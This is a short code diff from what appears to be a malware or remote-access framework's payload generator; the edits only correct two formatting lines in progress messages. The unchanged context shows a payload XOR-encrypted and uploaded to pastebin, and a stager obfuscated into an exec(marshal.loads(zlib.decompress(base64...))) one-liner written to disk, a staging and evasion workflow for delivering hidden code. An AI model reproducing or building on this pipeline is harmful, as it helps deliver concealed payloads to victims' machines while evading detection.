@@ -43,7 +43,7 @@ def py(options, payload='modules/payload.py', stager='resources/stager.py', **kw
             code = crypto.encrypt_xor(payload, key, block_size=8, key_size=16, num_rounds=32, padding='\x00')
             diff = round(float(100.0 * float(1.0 - float(len(code))/float(len(payload)))))
             print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Payload encryption complete")
-            print(color + colorama.Style.DIM + "    (Plaintext {:,} bytes {} to ciphertext {:,} bytes ({}% {})".format(len(stager), 'increased' if diff else 'reduced', len(code), diff, 4), 'larger' if diff else 'smaller').ljust(80 - len("[+] "))
+            print(color + colorama.Style.DIM + "    (Plaintext {:,} bytes {} to ciphertext {:,} bytes ({}% {})".format(len(stager), 'increased' if diff else 'reduced', len(code), diff, 'larger' if diff else 'smaller').ljust(80 - len("[+] "))
             payload = code
             kwargs.update({'xor_key': key})
         url = util.pastebin(payload)
@@ -55,7 +55,7 @@ def py(options, payload='modules/payload.py', stager='resources/stager.py', **kw
             code = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))))
             diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stager)))))
             print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Stager obfuscation and minification complete")
-            print(color + colorama.Style.DIM + "    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stager), 'increased' if diff else 'reduced', len(code), diff,  'larger' if diff else 'smaller').ljust(80 - len("[+] ")))
+            print(color + colorama.Style.DIM + "    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stager), 'increased' if diff else 'reduced', len(code), diff, 'larger' if diff else 'smaller').ljust(80 - len("[+] ")))
             stager = code
         with file(path, 'w') as fp:
             fp.write(stager)
